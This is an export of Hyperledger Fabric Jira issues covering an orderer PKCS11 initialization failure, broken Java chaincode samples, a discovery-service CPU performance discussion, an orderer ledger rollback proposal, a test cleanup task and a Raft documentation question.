2020-02-20 18:14:25.799 UTC [viperutil] getKeysRecursively -> DEBU 0bf Found real value for general.Cluster.CertExpirationWarningThreshold setting to <nil> <nil>
2020-02-20 18:14:25.799 UTC [viperutil] unmarshalJSON -> DEBU 0c0 Unmarshal JSON: value is not a string: <nil>
2020-02-20 18:14:25.799 UTC [viperutil] getKeysRecursively -> DEBU 0c1 Found real value for general.Cluster.ListenPort setting to <nil> <nil>
2020-02-20 18:14:25.799 UTC [viperutil] unmarshalJSON -> DEBU 0c2 Unmarshal JSON: value is not a string: 10
2020-02-20 18:14:25.799 UTC [viperutil] getKeysRecursively -> DEBU 0c3 Found real value for general.Cluster.SendBufferSize setting to int 10
2020-02-20 18:14:25.799 UTC [viperutil] unmarshalJSON -> DEBU 0c4 Unmarshal JSON: value is not a string: <nil>
2020-02-20 18:14:25.799 UTC [viperutil] getKeysRecursively -> DEBU 0c5 Found real value for general.Cluster.DialTimeout setting to <nil> <nil>
2020-02-20 18:14:25.799 UTC [viperutil] unmarshalJSON -> DEBU 0c6 Unmarshal JSON: value is not a string: <nil>
2020-02-20 18:14:25.799 UTC [viperutil] getKeysRecursively -> DEBU 0c7 Found real value for general.ConnectionTimeout setting to <nil> <nil>
2020-02-20 18:14:25.799 UTC [viperutil] unmarshalJSON -> DEBU 0c8 Unmarshal JSON: value is not a string: <nil>
2020-02-20 18:14:25.799 UTC [viperutil] getKeysRecursively -> DEBU 0c9 Found real value for general.SystemChannel setting to <nil> <nil>
2020-02-20 18:14:25.800 UTC [viperutil] getKeysRecursively -> DEBU 0ca Found map[string]interface{} value for general.TLS
2020-02-20 18:14:25.800 UTC [viperutil] unmarshalJSON -> DEBU 0cb Unmarshal JSON: value cannot be unmarshalled: invalid character 'l' in literal true (expecting 'r')
2020-02-20 18:14:25.800 UTC [viperutil] getKeysRecursively -> DEBU 0cc Found real value for general.TLS.PrivateKey setting to string tls/server.key
2020-02-20 18:14:25.800 UTC [viperutil] unmarshalJSON -> DEBU 0cd Unmarshal JSON: value cannot be unmarshalled: invalid character 'l' in literal true (expecting 'r')
2020-02-20 18:14:25.800 UTC [viperutil] getKeysRecursively -> DEBU 0ce Found real value for general.TLS.Certificate setting to string tls/server.crt
2020-02-20 18:14:25.800 UTC [viperutil] unmarshalJSON -> DEBU 0cf Unmarshal JSON: value is not a string: [tls/ca.crt]
2020-02-20 18:14:25.800 UTC [viperutil] getKeysRecursively -> DEBU 0d0 Found real value for general.TLS.RootCAs setting to []interface {} [tls/ca.crt]
2020-02-20 18:14:25.800 UTC [viperutil] unmarshalJSON -> DEBU 0d1 Unmarshal JSON: value is not a string: false
2020-02-20 18:14:25.800 UTC [viperutil] getKeysRecursively -> DEBU 0d2 Found real value for general.TLS.ClientAuthRequired setting to bool false
2020-02-20 18:14:25.800 UTC [viperutil] unmarshalJSON -> DEBU 0d3 Unmarshal JSON: value is not a string: <nil>
2020-02-20 18:14:25.800 UTC [viperutil] getKeysRecursively -> DEBU 0d4 Found real value for general.TLS.ClientRootCAs setting to <nil> <nil>
2020-02-20 18:14:25.800 UTC [viperutil] unmarshalJSON -> DEBU 0d5 Unmarshal JSON: value is not a string: false
2020-02-20 18:14:25.800 UTC [viperutil] getKeysRecursively -> DEBU 0d6 Found real value for general.TLS.Enabled setting to bool false
2020-02-20 18:14:25.800 UTC [viperutil] EnhancedExactUnmarshal -> DEBU 0d7 map[consensus:map[SnapDir:/var/hyperledger/production/orderer/etcdraft/snapshot WALDir:/var/hyperledger/production/orderer/etcdraft/wal] debug:map[BroadcastTraceDir:<nil> DeliverTraceDir:<nil>] fileledger:map[Location:/var/hyperledger/production/orderer Prefix:hyperledger-fabric-ordererledger] general:map[Authentication:map[NoExpirationChecks:<nil> TimeWindow:15m] BCCSP:map[Default:SW PKCS11:map[FileKeyStore:map[KeyStore:<nil>] Hash:<nil> Label:<nil> Library:<nil> Pin:<nil> Security:<nil>] SW:map[FileKeyStore:map[KeyStore:<nil>] Hash:SHA2 Security:256]] Cluster:map[CertExpirationWarningThreshold:<nil> ClientCertificate:<nil> ClientPrivateKey:<nil> DialTimeout:<nil> ListenAddress:<nil> ListenPort:<nil> RPCTimeout:<nil> ReplicationBackgroundRefreshInterval:<nil> ReplicationBufferSize:<nil> ReplicationMaxRetries:<nil> ReplicationPullTimeout:<nil> ReplicationRetryTimeout:<nil> RootCAs:<nil> SendBufferSize:10 ServerCertificate:<nil> ServerPrivateKey:<nil> TLSHandshakeTimeShift:<nil>] ConnectionTimeout:<nil> GenesisFile:genesisblock GenesisMethod:provisional GenesisProfile:SampleInsecureSolo Keepalive:map[ServerInterval:7200s ServerMinInterval:60s ServerTimeout:20s] LedgerType:file ListenAddress:127.0.0.1 ListenPort:7050 LocalMSPDir:msp LocalMSPID:SampleOrg Profile:map[Address:0.0.0.0:6060 Enabled:false] SystemChannel:<nil> TLS:map[Certificate:tls/server.crt ClientAuthRequired:false ClientRootCAs:<nil> Enabled:false PrivateKey:tls/server.key RootCAs:[tls/ca.crt]]] kafka:map[Retry:map[Consumer:map[RetryBackoff:2s] LongInterval:5m LongTotal:12h Metadata:map[RetryBackoff:250ms RetryMax:3] NetworkTimeouts:map[DialTimeout:10s ReadTimeout:10s WriteTimeout:10s] Producer:map[RetryBackoff:100ms RetryMax:3] ShortInterval:5s ShortTotal:10m] SASLPlain:map[Enabled:false Password:<nil> User:<nil>] TLS:map[Certificate:<nil> ClientAuthRequired:<nil> ClientRootCAs:<nil> Enabled:false PrivateKey:<nil> RootCAs:<nil>] Topic:map[ReplicationFactor:3] Verbose:false Version:<nil>] metrics:map[Provider:disabled Statsd:map[Address:127.0.0.1:8125 Network:udp Prefix:<nil> WriteInterval:30s]] operations:map[ListenAddress:127.0.0.1:8443 TLS:map[Certificate:<nil> ClientAuthRequired:false ClientRootCAs:[] Enabled:false PrivateKey:<nil> RootCAs:<nil>]] ramledger:map[HistorySize:1000]]
2020-02-20 18:14:25.801 UTC [localconfig] completeInitialization -> INFO 0d8 Kafka.Version unset, setting to 0.10.2.0
2020-02-20 18:14:25.801 UTC [bccsp_sw] openKeyStore -> DEBU 0d9 KeyStore opened at [/etc/hyperledger/fabric/msp/keystore]...done
2020-02-20 18:14:25.801 UTC [bccsp] initBCCSP -> DEBU 0da Initialize BCCSP [SW]
2020-02-20 18:14:25.801 UTC [orderer.common.server] initializeLocalMsp -> FATA 0db Failed to initialize local MSP: could not initialize BCCSP Factories: Failed initializing PKCS11.BCCSP %!s(<nil>): Could not initialize BCCSP PKCS11 [Failed to initialize software key store: An invalid KeyStore path provided. Path cannot be an empty string.]

{code}
Code should not try to initialize PKCS11 if DEFAULT is set to SW.

 

I believe this issue has existed in previous versions as well.",,ahmedsajid,ryjones,ymlbright,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i019cb:",,,,Unset,Unset,,"1) Checkout Fabric v1.4.5
2) Build Orderer Docker image using make
DOCKER_DYNAMIC_LINK=true  EXPERIMENTAL=false GO_TAGS=""pkcs11"" make orderer-docker
3) Try running docker image 
docker run -d -e ""FABRIC_LOGGING_SPEC=debug"" --name orderer-hlf-pkcs11 hyperledger/fabric-orderer:amd64-1.4.5-snapshot-11ff99170
4) Orderer fails to start with error.

",,Unset,,,,,,Unset,,Unset,,(Please add usage information),ahmedsajid,ryjones,ymlbright,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-1.4,release-2.5,release-2.4,main,release-2.0,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"29/Feb/20 6:59 AM;ahmedsajid;PR submitted: [https://github.com/hyperledger/fabric/pull/769/];;;","11/Mar/20 3:08 AM;ryjones;https://github.com/hyperledger/fabric/pull/769 (release-1.4)
https://github.com/hyperledger/fabric/pull/821 (release-2.0)
https://github.com/hyperledger/fabric/pull/822 (master);;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fabcar and asset-transfer-basic Java samples are broken,FAB-17518,44384,,Bug,Unverified,FAB,Fabric,software,denyeart,,,High,,,toxzic,toxzic,21/Feb/20 6:05 PM,22/Oct/20 7:54 PM,28/Oct/23 3:09 AM,,v2.0.0,v2.0.1,v2.1.0,,,,,,,,,,,fabric-samples,,,,,,,,,1,,,,,,"Chaincode installation fails:
{noformat}
~ # peer lifecycle chaincode install asset-transfer-basic.tar.gz
Error: chaincode install failed with status: 500 - failed to invoke backing implementation of 'InstallChaincode': could not build chaincode: docker build failed: docker image build failed: Post ""http://localhost:2375/build?networkmode=host&t=nid1-nw-242-142-3-nd-758-248-570-asset-transfer-basic-450f44681ed595bf1780960f661cdd4433cf6f62dc6debd7daf232e7f4c54d31-ed7349a7db9b52dba4d1e464b8be36a1642fe117e611b595987769a72deb32e9"": docker build failed: Error returned from build: 1 ""+ INPUT_DIR=/chaincode/input
+ OUTPUT_DIR=/chaincode/output
++ mktemp -d
+ TMP_DIR=/tmp/tmp.HphDKd
++ find /chaincode/input -name .jar
++ paste -s -d : -
+ JARS=
++ find /chaincode/input -name '*.jar'
++ wc -l
+ NUM_JARS=1
+ for DIR in ${INPUT_DIR} ${INPUT_DIR}/src
+ '[' -f /chaincode/input/build.gradle -o -f /chaincode/input/build.gradle.kts ']'
+ '[' -f /chaincode/input/pom.xml ']'
+ for DIR in ${INPUT_DIR} ${INPUT_DIR}/src
+ '[' -f /chaincode/input/src/build.gradle -o -f /chaincode/input/src/build.gradle.kts ']'
+ buildGradle /chaincode/input/src /chaincode/output
+ echo 'Copying from /chaincode/input/src to /tmp/tmp.HphDKd'
Copying from /chaincode/input/src to /tmp/tmp.HphDKd
+ cd /chaincode/input/src
+ tar cf - .
+ cd /tmp/tmp.HphDKd
+ tar xf -
Gradle build
+ cd /tmp/tmp.HphDKd
+ echo 'Gradle build'
+ '[' -f ./gradlew ']'
+ chmod +x ./gradlew
+ ./gradlew build shadowJar -x test
Downloading https://services.gradle.org/distributions/gradle-6.5.1-bin.zip
.................................................................................................
Welcome to Gradle 6.5.1!
Here are the highlights of this release:
 - Experimental file-system watching
 - Improved version ordering
 - New samples
For more details see https://docs.gradle.org/6.5.1/release-notes.html
Starting a Gradle Daemon (subsequent builds will be faster)
FAILURE: Build failed with an exception.
* What went wrong:
Task 'shadowJar' not found in root project 'basic'.
* Try:
Run gradlew tasks to get a list of available tasks. Run with --stacktrace option to get the stack trace. Run with --info or --debug option to get more log output. Run with --scan to get full insights.
* Get more help at https://help.gradle.org
BUILD FAILED in 21s
""
{noformat}
[https://github.com/hyperledger/fabric-samples/blob/master/asset-transfer-basic/chaincode-java/build.gradle] is missing shadowJar task while it is required by the chaincode builder: [https://github.com/hyperledger/fabric-chaincode-java/blob/master/fabric-chaincode-docker/build.sh#L18.]

E.g. everything works well for [https://github.com/hyperledger/fabric-samples/tree/master/chaincode/abstore/java] which has a shadowJar task:
{noformat}
~ # peer lifecycle chaincode install abstore.tar.gz
2020-10-22 10:36:39.821 UTC [cli.lifecycle.chaincode] submitInstallProposal -> INFO 001 Installed remotely: response:<status:200 payl
oad:""\nHabstore:541c4f83dc833fdf667b4f25f237ee53f5d401517f8886df9d7b5572bea9c831\022\007abstore"" >
2020-10-22 10:36:39.823 UTC [cli.lifecycle.chaincode] submitInstallProposal -> INFO 002 Chaincode code package identifier: abstore:54
1c4f83dc833fdf667b4f25f237ee53f5d401517f8886df9d7b5572bea9c831{noformat}
 ",,toxzic,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i019cz:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),toxzic,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Discovery service performance issue,FAB-17519,44385,,Bug,To Do,FAB,Fabric,software,denyeart,,,Medium,,,mplisov,mplisov,21/Feb/20 6:26 PM,15/Apr/21 7:27 AM,28/Oct/23 3:09 AM,,v1.4.4,v1.4.5,,,,,,,,v2.x,,,,fabric-gossip,,,,,,,,,0,ipm2,,,,,"We run several channels with 3 chaincodes having endorsement policies like

ORG1 & OUTOF(7, ORG2..ORG14)

ORG1 has two endorsing peers, others have single.

 

Transactions are produced by gateway software fabric-sdk-go v1.0.0-beta1 with dynamic discovery on.

 At some point of time peer process start consuming all cpu . Load doesn’t end at turning off of gateway software of that org. CPU load spike doesn't start immediately. 

 Attaching trace of peer process during this problem.

 Probably Discovery shouldn’t try to build all possible combinations of endorsing peers and just return N variants to save CPU and bandwidth?

 

 ",,denyeart,mplisov,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"26/Feb/20 9:52 PM;mplisov;1.4.6-pprof.pdf;https://jira.hyperledger.org/secure/attachment/18143/1.4.6-pprof.pdf","26/Feb/20 6:31 PM;mplisov;1.4.6-pprof.svg;https://jira.hyperledger.org/secure/attachment/18141/1.4.6-pprof.svg","21/Feb/20 6:25 PM;mplisov;trace.svg;https://jira.hyperledger.org/secure/attachment/18135/trace.svg",,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-14513,,,No,,Unset,No,,,"1|i01h7w:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,mplisov,yacovm,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-1.4,release-2.5,release-2.4,main,release-2.0,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"21/Feb/20 9:08 PM;yacovm;14 choose 7 is 3,432.

Discovery starts [pruning combinations|https://github.com/hyperledger/fabric/blob/master/common/graph/perm.go#L111] [once it reached 10,000|https://github.com/hyperledger/fabric/blob/master/common/policies/inquire/inquire.go#L43].

{quote}Load doesn’t end at turning off of gateway software of that org{quote}

Can you attach the logs? How many queries are being sent to the peer in general?;;;","21/Feb/20 9:16 PM;yacovm;Another thing we can try to do, is to optimize the [function|https://github.com/hyperledger/fabric/blob/master/common/policies/inquire/merge.go#L273-L287] to not use reflection.

I'll try and look at it today in a few hours.;;;","21/Feb/20 9:28 PM;mplisov;rate(endorser_proposals_received[1m]) ~ 2;;;","21/Feb/20 9:29 PM;mplisov;I think that for doing its job Discovery client doesn't need thousands of combinations. It generally doesn't have enough time to to try them all.;;;","21/Feb/20 9:38 PM;yacovm;Why not? If the client is running for a day and is making a transaction per minute then it's already around 1.5K transactions.;;;","21/Feb/20 9:48 PM;mplisov;But it gets this new set every

defaultSelectionRefreshInterval = time.Second * 5;;;","21/Feb/20 9:50 PM;yacovm;Well I don't see a reason to get it every 15 seconds, but I'm sure you can configure it to do it every few hours.;;;","21/Feb/20 9:52 PM;yacovm;Though I think this will create another problem - you won't know when peers are offline in time this way. 
I guess, it's possible to make an endorsement query and then ""hold it"" for a few hours and just refresh the peer membership by doing a membership query every 15 seconds which is cheap. 
However these are all changes that need to be done at the client side, and I'm not the address... [~troyronda] [~bstasyszyn] what do you say?;;;","21/Feb/20 9:54 PM;mplisov;Yep, we switching to getting from discovery only peer list for channel and constructing of peers list  for endorsement simply by rand among them while keeping track of responsive ones;;;","21/Feb/20 10:07 PM;yacovm;You can issue a membership query to get the responsive ones, it's fairly cheap - just taking a read lock and copying memory.;;;","21/Feb/20 10:48 PM;mplisov;There is a little note on membership query. Peer will be in results even if it has firewall rules preventing connecting to their endpoint. Bumped into this several times.;;;","21/Feb/20 11:36 PM;mplisov;[~yacovm] Imagine some policy like AND(OUTOF(3, org1..org16), OUTOF(3, ORG17..ORG30) )

In current implementation it would be a quite a big answer from Discovery.

Maybe it would be beneficial for client to receive answer with endpoint groups + number of endpoints to pick randomly from them.

Why would client would want to get precomputed thousands of variants?

 ;;;","22/Feb/20 12:24 AM;yacovm;Because an endorsement policy can be not only based on organizations, but based on other stuff like OUs, and arbitrary information that exists in the ledger. 

Ideally, we would have had discovery just send the SDK an encoded policy tree and the group to peer matching, however then it would mean that all SDKs would need to implement the random tree traversals, and historically  when discovery was implemented in Fabric v1.2, that was unrealistic. 

It theory it's possible to go down this path, and have discovery send a principal enumeration in the form of a policy tree, and then a matching graph from principals to peers. However I doubt that this will happen anytime soon, as endorsement policies that are big and complex are very rare. 

What is the use case that you see for an endorsement policy that you described? Is it that the world is split into 2 factions and each faction wants some peers of its own to endorse or something like that?;;;","22/Feb/20 12:48 AM;mplisov;I can imagine complex endorsement policies in case of different types of participants like Govmt agencies + group of auditors + some market participants. And they could agree to include 1+ signatures from each group. 

What are recommendations on endorsement policies in case of large number of orgs in channel?

(for example tradelens case)?;;;","22/Feb/20 3:55 AM;yacovm;I don't really know what is the recommendation and also I don't know what is tradelens' case.

https://github.com/hyperledger/fabric/pull/710 

I made it run faster (checked with go bench).;;;","25/Feb/20 7:02 PM;denyeart;Merged in release-1.4, release-2.0, master.;;;","25/Feb/20 7:55 PM;yacovm;I'm not sure this really solves the issue, as this just reduces the cost of a comparison but the evaluation is still with exponential complexity.

 

[~mplisov] do you want to check to see if it has improved?;;;","25/Feb/20 9:04 PM;mplisov;I'll try to reproduce it on testnet. 

On our production network we changed go-sdk settings to more realistic ones and it solved the problem.

I think that  there is another issue to catch here. Why cpu load didn't go away when client sdk software goes down?

Probably some race between pruning combinations vs calcualate new ones? I'll try to investigate that.

We caught this bug when 3 channels with such ""large"" endorsing policies appeared.

 

Yacov, whats your opinion on implementing discover endorsers method with parameter specifying number of returned combinations? I think it could be beneficial to situations with tens of thousands of combinations at least in terms of latency and mem\cpu usage.

Here is the example how fabric-sdk-go uses all this huge array:

[https://github.com/hyperledger/fabric/blob/f032ff7d5ef4e3e3e5881a44a3c52bc9f589d296/discovery/client/client.go#L270]

 ;;;","26/Feb/20 12:57 AM;yacovm;{quote}I think that there is another issue to catch here. Why cpu load didn't go away when client sdk software goes down?
{quote}
I don't know but I doubt this is related to service discovery as it's simply an RPC call and it doesn't allocate any goroutines.

All resources are released once the RPC call ends.
{quote} 
 Yacov, whats your opinion on implementing discover endorsers method with parameter specifying number of returned combinations? I think it could be beneficial to situations with tens of thousands of combinations at least in terms of latency and mem\cpu usage.
{quote}
 

I can do it, but I want to couple it with pruning of organizations that are unreachable prior to the endorsement policy analysis.

The reason is that if you have lots of organizations then it increases the chance that the peers are not reachable.

Currently, discovery does the endorsement analysis without taking into account whether the organizations are even reachable, and relies on the fact that you'll just skip combinations that no peers are alive (since you get the peers too).

If we prune the combinations ahead we might get into a situation where the result contains only combinations with organizations with no reachable peers.

 

This is not simple, but also not too complex, I just need time which unfortunately is scarce these days :(

 
{quote}Here is the example how fabric-sdk-go uses all this huge array:
{quote}
This is my code imported from the Fabric core :);;;","26/Feb/20 6:31 PM;mplisov;Hello Yacov,

Tested with 1.4.6. Unfortunately it din't solve the issue. Attaching trace.

I can confirm that stopping gateway software doesn't stop cpu load of peer process (waited 3mins) and checked logs that no discover grpc calls.;;;","26/Feb/20 7:20 PM;yacovm;Is the SVG file you uploaded corrupted?  I can't see anything but gray;;;","26/Feb/20 8:03 PM;mplisov;save as.. and it opens fine. clicking in Jira gives me blank too.;;;","26/Feb/20 9:40 PM;yacovm;Doesn't work for me... any chance you convert it to PNG or something?;;;","26/Feb/20 9:52 PM;mplisov;Attached pdf;;;","27/Feb/20 1:59 AM;yacovm;I'm re-opening this and will take care of it when i find time;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Provide a way to rollback ledgers on Ordering Nodes.,FAB-17520,44387,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,ptippett,ptippett,21/Feb/20 11:10 PM,20/Jan/22 7:54 AM,28/Oct/23 3:09 AM,06/Jun/20 2:18 AM,,,,,,,,,,,,,,fabric-orderer,,,,,,,,,0,,,,,,"Despite the fact that the ledger is immutable and that you can spread nodes around to different Geos to reduce risk of disaster.  Users are still asking for backup/restore capability for a few reasons:
1 - Human Error.  Accidental Deletion for example.
2 - Code issues where it's easier to revert the ledger vs undo damage.
3 - Corporate requirements that anything in prod must have a tested backup/restore plan.

 

This is easy when not using Private Data collections.  Keep the peers behind the ordering nodes and everything works fine.  If you ever need to restore the ordering service for example, you can either stand up new peers and let them catch up, or restore the peers to an earlier backup to speed up the process and avoid having to redo chaincode/channel operations. 

 

The issue is when using PDCs, there's no good way to orchestrate a backup because the orderer being behind the peers of course still doesn't work, and the peers being behind the orderer doesn't really work either.  

To fix this, I believe you have 3 options:

1 - Stop all peers and orderers to ensure consistency, back everything up, start it up again.  This of course causes an outage with every backup, which is bad and is hard to orchestrate given that different organizations own the peers.

2 - Restore the peers to a point earlier than the orderers.  This doesn't work without work on the user because the orderer will have hashes for private data that the peers no longer have and the peers will keep trying to fetch the data.  My understanding is to fix this the user would have to do blind writes to the PDC in their application.

3 - Roll back the ledgers on the orderering nodes  to a height that matches that of the ""highest"" peer.  This is preferred to rolling back peers because it matches the restore flow for non PDC of always keeping the orderers ahead of peers, and because there will normally be less ordering nodes owned by less organizations than the peers.  So the rollback process would be easier.

The point of this story is to provide the ability to perform option 3 above in Fabric.  In addition to the ability to be able to roll back the orderer to a specific block height on a ledger, some additional code/doc would be needed to help users figure out how far to roll back each channel.

Alternatively, if it can be proven that option 2 above is an easier/better way to get back to a consistent state and code/instructions can be provided to do that, that could also suffice.


To be very clear.  No one is expecting the PDC or any other data that was lost in the restore process to be recovered.  It's a restore from backup.  Everyone understands that anything done after the backup is gone forever and this would only be done/recommended as a last resort.  The goal of this issue is to be able to restore fabric to a consistent state such that operation can continue cleanly going forward.

 

 ",,ahmedsajid,denyeart,guoger,jeremy-ls,jyellick,kentbull,ptippett,rolivieri,ScottAllan,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-18089,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i019dn:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),ahmedsajid,denyeart,guoger,jeremy-ls,jyellick,kentbull,ptippett,rolivieri,ScottAllan,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"29/Feb/20 4:45 AM;jyellick;In order to allow Raft to re-initialize, we'll need to do a few things:

We need to ensure that the metadata is nil here, in order to trigger the {{isMigration}} [is true|https://github.com/hyperledger/fabric/blob/b78d79ba5ec83e645fec4fc4139479317fb11f59/orderer/consensus/etcdraft/consenter.go#L141-L144].

And, we'll need to ensure that the WAL is deleted so that {{fresh}} [is false|https://github.com/hyperledger/fabric/blob/master/orderer/consensus/etcdraft/chain.go#L215].

This will trigger the etcdraft code to [treat the startup as a new channel|https://github.com/hyperledger/fabric/blob/b78d79ba5ec83e645fec4fc4139479317fb11f59/orderer/consensus/etcdraft/node.go#L62-L73].

The metadata field comes from [here|https://github.com/hyperledger/fabric/blob/b78d79ba5ec83e645fec4fc4139479317fb11f59/orderer/common/multichannel/chainsupport.go#L49] where it is simply unmarshaling a field in the block. The problem we have, is that this is a signed field, and, the peers check that this signature is valid. So, we'll need to decide how we want to handle this.

We could have the orderer re-sign the metadata, but this poses a few different possible problems.

a) There is a corner case, where this OSN got this block via state transfer, for a channel config in which they are not an authorized block writer, and therefore they are not authorized to sign.
 b) For future BFT support where we need multiple signatures over the metadata, it breaks as well.

So, I think we'll need to signal to the orderer in some other way that this i a reset block. The most obvious way to do this to me, would be to extend the metadata encoding for the field to allow additional unsigned data that the orderer would prefer, if it were present. Or, we could add a new metadata slot in the metadata slice, which would be for such overrides. I'm open to opinions or better options.;;;","29/Feb/20 7:52 AM;yacovm;{quote} 

2 - Restore the peers to a point earlier than the orderers. This doesn't work without work on the user because the orderer will have hashes for private data that the peers no longer have and the peers will keep trying to fetch the data. My understanding is to fix this the user would have to do blind writes to the PDC in their application.
{quote}
 

But if the peers committed the pre-images they should be able to correlate the hashes with the private data.

Am I missing something? Because it seems to me that we just need to ensure that pre-images aren't wiped out as part of ledger reset.

 ;;;","03/Mar/20 4:04 PM;guoger;bq.  And, we'll need to ensure that the WAL is deleted so that fresh is false.
I believe you meant ""so that fresh is true""? [~jyellick]

i'm not really a fan of rolling back ledger on orderers. I'm trying to understand how that pre-image is being wiped out from network?;;;","06/Jun/20 2:18 AM;denyeart;For restoring a network, we've decided it is better to utilize peer rollbacks to a prior backed up orderer height, rather than orderer rollbacks.

See proposal at:

[https://docs.google.com/presentation/d/10v3cFga-Z5TFaCsgQNKBf7KuXfF1POYVSwGRSrT2muY/edit#slide=id.p1]

For now at least, I'll mark this issue as Won't Do.  We could re-open later if it is determined that orderer rollbacks are required.;;;","20/Jan/22 7:54 AM;kentbull;Bad blocks caused by certificate installation and configuration problems during rotation events seem to be a good use case for orderer rollback in the event of a crypto material mishap. For example: I had a system that had a certificate expiration problem due to crossing the one year mark, the 8760 hour mark from the default config in `ca.yaml` 

I accidentally, rather ignorantly, rotated the following keypairs:
* my CA keypair
* my CA ECert
* my orderer org admin keypair (private key + ECert)
* my peer org admin keypair (private key + ECert)
* my orderer user keypair (private key + ECert)
* my peer user keypair (private key + ECert)

Then I sent a block to the orderer that got the following error:

{code:bash}
[timestamp] [cauthdsl] deduplicate -> ERRO 045 Principal deserialization failure (the supplied identity is not valid: x509: certificate signed by unknown authority (possibly because of ""x509: ECDSA verification failure"" while trying to verify candidate authority certificate ""kentbull.com"")) for identity 0
[timestamp] [blocksProvider] DeliverBlocks -> ERRO 046 [bullyard] Error verifying block with sequence number 1215, due to implicit policy evaluation failed - 0 sub-policies were satisfied, but this policy requires 1 of the 'Writers' sub-policies to be satisfied
{code}

Simple setup, one peer, one orderer, two organizations, one CA.

After I couldn't get past this error I reverted the newly rotated material and used the old crypto material (MSP directories and ECerts, etc.) to boot my network up again.


I started from a certificate expiration error and decided to rotate the above crypto material since I didn't know what I was doing and I thought that would help. 13 days later, and a bunch of docs reading and troubleshooting into this (130+ hours), I determined I needed to time-shift backwards, sign a configuration block with the old admin identities, Peer and Orderer, where the new config block contains the ECert of the new Peer and Orderer org admins. Then I would roll to the present, put the new crypto material in the appropriate MSP directories, and start up the newly configured network. 

This worked perfectly in dev, staging, and an acceptance test environment. However, production had this weird block that was sent to the orderer with the rotated root of trust and for whatever reason the orderer won't let go of that block. This effectively prevents all installation of chaincode, all transactions, and anything on the peer.

I've tried rollback and reset on the peer though of course that makes no difference since the Orderer pushes the bad block onto the peer.

Maybe I'm just misconfiguring my peer or orderer crypto material. Yet it seems there's something else going on here.

;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Remove protoutil.MarshalOrPanic from pkg/config/policyparser_test.go,FAB-17521,44389,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,dereckluo,caod,caod,22/Feb/20 12:57 AM,17/Mar/20 4:24 AM,28/Oct/23 3:09 AM,26/Feb/20 6:23 AM,,,,,,,,,,,,,,,,,,,,,,,0,configtx,,,,,We're trying to avoid importing protoutil. Even though this is a test might as well just convert the MarshalOrPanic calls to err := proto.Marshal(...) and Expect(err).NotTo(HaveOccurred()),,caod,dereckluo,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i019dv:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,dereckluo,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"22/Feb/20 1:31 AM;dereckluo;https://github.com/hyperledger/fabric/pull/705;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Read-only query transaction RAFT consensus behavior documentation,FAB-17522,44390,,Documentation,Backlog,FAB,Fabric,software,denyeart,,,Medium,,,pvrbharg,pvrbharg,22/Feb/20 3:13 AM,19/Apr/20 12:50 PM,28/Oct/23 3:09 AM,,,,,,,,,,,,,,,fabric-docs,,,,,,,,,0,help-wanted,,,,,"[|https://hyperledger-fabric.readthedocs.io/en/release-1.4/orderer/ordering_service.html#raft-concepts] [^RAFT-ReadOnlyQuery-QuorumIssue.pdf]https://hyperledger-fabric.readthedocs.io/en/release-1.4/orderer/ordering_service.html#raft-concepts

""If a quorum of nodes is unavailable for any reason, the ordering service cluster becomes unavailable for both read and write operations on the channel, and no new logs can be committed.""

